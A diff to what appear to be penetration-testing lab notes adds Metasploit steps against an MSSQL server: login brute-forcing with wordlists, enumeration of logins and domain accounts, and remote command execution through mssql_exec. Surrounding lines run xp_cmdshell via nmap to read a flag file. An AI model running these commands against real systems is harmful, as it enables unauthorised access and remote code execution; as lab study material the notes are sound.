@@ -380,13 +380,40 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssq
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.20.186
 
 ```
-23)  
+23)  Recon: MSSQL: Metasploit
 
 ```
-
+cat /root/Desktop/target
+nmap 10.0.20.101
+nmap --script ms-sql-info -p 1433 10.0.20.101
+msfconsole -q
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 10.0.20.101
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+set VERBOSE false
+exploit
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS 10.0.20.101
+exploit
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS 10.0.20.101
+exploit
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS 10.0.20.101
+set CMD whoami
+exploit
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS 10.0.20.101
+exploit
 ```
-
 24)  
+
+```
+
+```
+
+25)  
 
 ```
 
